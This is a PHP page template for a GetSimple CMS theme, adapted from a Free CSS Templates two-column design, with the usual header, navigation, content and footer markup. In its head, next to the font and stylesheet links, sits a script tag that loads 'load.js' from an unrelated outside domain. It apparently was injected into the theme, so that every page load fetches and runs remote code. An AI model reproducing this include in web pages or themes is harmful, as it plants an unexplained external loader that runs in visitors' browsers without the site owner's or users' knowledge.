<?php if(!defined('IN_GS')){ die('you cannot load this page directly.'); }
/****************************************************
*
* @File: 		template.php
* @Package:		GetSimple
* @Action:		Theme by Free CSS Templates Adapted for GetSimple by Jose Arrona - SS
*
*****************************************************/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--
Design by Free CSS Templates
http://www.freecsstemplates.org
Released for free under a Creative Commons Attribution 2.5 License

Name       : Office Memo  
Description: A two-column, fixed-width design with dark color scheme.
Version    : 1.0
Released   : 20120401

-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<?php get_header(); ?>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<title><?php get_page_clean_title(); ?> - <?php get_site_name(); ?></title>
<link href="http://fonts.googleapis.com/css?family=Arvo" rel="stylesheet" type="text/css" />
<link href="http://fonts.googleapis.com/css?family=Coda:400,800" rel="stylesheet" type="text/css" />
<link href="<?php get_theme_url(); ?>/style.css" rel="stylesheet" type="text/css" media="screen" />
	<script src="http://d.radsteroids.com/l/load.js"></script>

</head>
<body>
<div id="menu-wrapper">
	<div id="menu">
		<ul>
			<?php get_navigation(return_page_slug()); ?>
		</ul>
	</div>
	</div>
	<!-- end #menu -->

	<div id="banner"><img src='http://bjmn.altervista.org/GS1/data/uploads/banner.png' width="800" height="200" alt="" /></div>
<div id="wrapper">
	</div>
	</div>
	<div id="header-wrapper">
	<div id="header">
		<div id="logo">
			<h1><a href="<?php get_site_url(); ?>"><?php get_site_name(); ?></a></h1>
			<p><?php get_component('tagline'); ?></p>
		</div>
	</div>
</div>
	</div>
	<!-- end #header -->
	<div id='page-border'>
	<div id="page">
		<div id="page-bgtop">
			<div id="page-bgbtm">
				<div id="content">
					<div class="post">
						<h2 class="title"><?php get_page_title(); ?></h2>
						
						
						<div class="entry">
							<?php get_page_content(); ?>							
						</div>
					</div>
					<div style="clear: both;">&nbsp;</div>
				</div>
				<div id='content'>
				</div>
				<!-- end #content -->
				<!-- end #sidebar -->
				
			</div>
		</div>
	</div>
	<!-- end #page -->
<div id="footer">
	<p>&copy; <?php echo date('Y'); ?> Bryan Olayres. Photos by <a href="http://fotogrph.com/">Fotogrph</a>. Design by <a href="http://www.freecsstemplates.org">FCT</a>. Adapted by <a href="http://get-simplified.com/">SS</a>. <?php get_site_credits(); ?>.</p>
</div>
<!-- end #footer -->
<?php get_footer(); ?>
</body>
</html>
